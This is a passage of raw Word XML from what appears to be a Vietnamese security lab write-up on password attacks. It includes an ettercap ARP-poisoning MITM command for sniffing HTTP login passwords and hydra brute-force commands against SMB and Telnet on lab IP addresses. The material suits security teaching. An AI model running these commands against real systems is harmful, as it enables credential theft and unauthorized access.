          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Chặn các luồng dữ liệu xáo trộn và giải mã thuật toán mã hóa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2D80A8">
      <w:pPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="151" w:beforeLines="50" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B16812">
      <w:pPr>
        <w:pStyle w:val="85"/>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firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">Thực hiện:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA1B75E">
      <w:pPr>
        <w:pStyle w:val="85"/>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firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Mục Tiêu:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Thu thập password từ traffic mạng (WiFi, HTTP).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF618B9">
      <w:pPr>
        <w:pStyle w:val="85"/>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firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Sniffing Password trên HTTP Website (VD: Form Đăng Nhập)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46559F5D">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Công cụ:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Wireshark</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Ettercap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> (ARP Poisoning).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079CAC07">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun" w:cs="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun" w:cs="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Thực hiện MITM bằng Ettercap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C159A6A">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun" w:cs="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun" w:cs="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Trên kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F64EC0">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>sudo ettercap -T -i eth0 -M arp:remote /192.168.8.1// /192.168.8.129//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C20C9F3">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="SimSun" w:hAnsi="SimSun" w:eastAsia="SimSun"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78E34747">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>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Chars="0" w:right="0" w:rightChars="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:eastAsia="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5667032E">
      <w:pPr>
        <w:pStyle w:val="85"/>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105" w:afterLines="35" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45FCB9A6">
      <w:pPr>
        <w:pStyle w:val="85"/>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ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F7E0B0B">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="384" w:beforeAutospacing="0" w:after="192" w:afterAutospacing="0" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PHẦN 2: ACTIVE ONLINE ATTACK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F55AEF7">
      <w:pPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="151" w:beforeLines="50" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Mục Tiêu:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Tấn công dò mật khẩu trực tiếp vào một dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C944A5">
      <w:pPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="151" w:beforeLines="50" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>1 SMB trên window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768249DF">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SMB (Server Message Block)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A781F3C">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Là </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>giao thức chia sẻ file và máy in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> trong Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9117CF">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chạy mặc định ở </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>port 445</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C830D1">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>hydra -L ~/Desktop/user.txt -P ~/Desktop/pass.txt -t 1 192.168.8.121 smb -V</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC4F738">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="192" w:beforeAutospacing="0" w:after="192" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:leftChars="0" w:right="0" w:firstLine="0" w:firstLineChars="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Brute-force Dịch Vụ SSH (Linux Users)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70219067">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCF1770">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Là </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>giao thức điều khiển từ xa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (remote login)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E3B807">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chạy mặc định ở </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>port 23</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE083C4">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cho phép bạn mở </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>terminal của máy khác</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> qua mạng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD981CE">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>ydra -L ~/Desktop/user2.txt -P ~/Desktop/pass2.txt 192.168.8.121 telnet -V</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486060F3">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00664703">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> là giao thức giúp bạn </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>điều khiển máy tính từ xa qua dòng lệnh</w:t>
      </w:r>
      <w:r>
        <w:t>, an toàn hơn Telnet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367F6533">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Chạy mặc định ở </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>port 22</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58485DAF">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Khác với Telnet, SSH </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>mã hóa toàn bộ dữ liệu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bao gồm mật khẩu)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE81497">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:right="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Công cụ:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
